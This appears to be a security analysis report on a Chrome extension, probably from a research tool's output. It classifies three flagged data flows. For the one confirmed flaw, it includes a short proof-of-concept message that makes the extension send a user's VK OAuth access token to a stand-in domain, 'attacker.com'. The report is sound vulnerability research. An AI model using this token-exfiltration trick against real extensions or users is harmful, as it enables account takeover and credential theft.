# CoCo Analysis: bfjnocmppakoiippbkbejmipphhkfhok

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 3 (1 TRUE POSITIVE, 2 FALSE POSITIVE)

---

## Sink 1: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bfjnocmppakoiippbkbejmipphhkfhok/opgen_generated_files/bg.js
Line 1032: chrome.storage.local.set({ requestDomain: request.domain }, function () {});

**Code:**

```javascript
// Background script - External message handler (lines 1026-1039)
chrome.runtime.onMessageExternal.addListener((request, sender, sendResponse) => {
  if (request.type === 'otys' && request.directive === 'otysGetUserToken') {
    var vkCLientId = "6974856",
        vkRequestedScopes = "docs,wall,market,groups,offline,photos",
        vkAuthenticationUrl = "https://oauth.vk.com/authorize?client_id=" + vkCLientId + "&scope=" + vkRequestedScopes + "&redirect_uri=http%3A%2F%2Foauth.vk.com%2Fblank.html&display=page&response_type=token";

    chrome.storage.local.set({ requestDomain: request.domain }, function () {}); // ← Stores attacker domain
    chrome.storage.local.get({ vkaccess_token: {} }, function (items) {
      chrome.tabs.update({ url: vkAuthenticationUrl }, function (tab) {
        chrome.tabs.onUpdated.addListener(listenerHandler(tab.id, vkAuthenticationUrl));
      });
    });
  }
});

// OAuth callback handler (lines 987-1023)
function listenerHandler(authenticationTabId, SourceUrl) {
	return function tabUpdateListener(tabId, changeInfo, tab) {
		var vkAccessToken, vkAccessTokenExpiredFlag, prop = {};

		if (tabId === authenticationTabId && changeInfo.status === "complete") {
			chrome.tabs.get(tabId, function (currentTab) {
				if (currentTab.url.indexOf("oauth.vk.com/blank.html") > -1) {
					authenticationTabId = null;
					chrome.tabs.onUpdated.removeListener(tabUpdateListener);
					vkAccessToken = getUrlParameterValue(currentTab.url, "access_token"); // Get VK token
					vkAccessTokenExpiredFlag = Number(getUrlParameterValue(currentTab.url, "expires_in"));

					chrome.storage.local.set({ vkaccess_token: vkAccessToken }, function () {
						chrome.storage.local.get({ requestDomain: {} }, function (items) {
							// Retrieves attacker-controlled domain and sends VK token to it!
							prop.url = "https://" + items.requestDomain + "/vk?token=" + vkAccessToken; // ← attacker domain + token
							chrome.tabs.update(tabId, prop, function (tab) {
								chrome.storage.local.remove('vkaccess_token', function() {});
							});
						});
					});
				}
			});
		}
	};
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From any website (even though manifest restricts to *.otys.ru,
// per methodology we ignore externally_connectable restrictions)
chrome.runtime.sendMessage(
  'extension_id_here',
  {
    type: 'otys',
    directive: 'otysGetUserToken',
    domain: 'attacker.com' // ← Attacker-controlled domain
  }
);

// The extension will:
// 1. Store attacker.com to chrome.storage.local
// 2. Open VK OAuth page for user authentication
// 3. After user authorizes, extract VK access token from OAuth callback
// 4. Navigate to https://attacker.com/vk?token=<VK_ACCESS_TOKEN>
// 5. Attacker receives the VK access token!
```

**Impact:** Credential theft. An attacker can trigger the extension's VK OAuth flow and steal the resulting VK (VKontakte) access token by having the extension send it to an attacker-controlled domain. With the stolen VK access token, the attacker gains full access to the victim's VK account with permissions for "docs,wall,market,groups,offline,photos".

---

## Sink 2 & 3: cs_window_eventListener_message → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bfjnocmppakoiippbkbejmipphhkfhok/opgen_generated_files/cs_0.js
Line 467: window.addEventListener('message', function(event) {
Line 468: if (event.data.directive === "authInApp") {
Line 469: chrome.storage.sync.set({ user: event.data });

**Code:**

```javascript
// Content script - runs on all HTTPS sites (lines 467-471)
window.addEventListener('message', function(event) {
  if (event.data.directive === "authInApp") {
    chrome.storage.sync.set({ user: event.data }); // Stores postMessage data
  }
})

// Note: The 'user' key is never retrieved anywhere in the extension
```

**Classification:** FALSE POSITIVE

**Reason:** Incomplete storage exploitation. The content script (which runs on all HTTPS sites per manifest line 25: "matches": ["https://*/*"]) listens for window.postMessage events and stores event.data to chrome.storage.sync when directive equals "authInApp". However, the stored 'user' value is never retrieved or used anywhere else in the extension codebase. Storage poisoning alone (storage.set without retrieval path) is not exploitable - the attacker must be able to retrieve the poisoned data back via sendResponse, postMessage, or use it in a subsequent vulnerable operation. No such retrieval path exists.
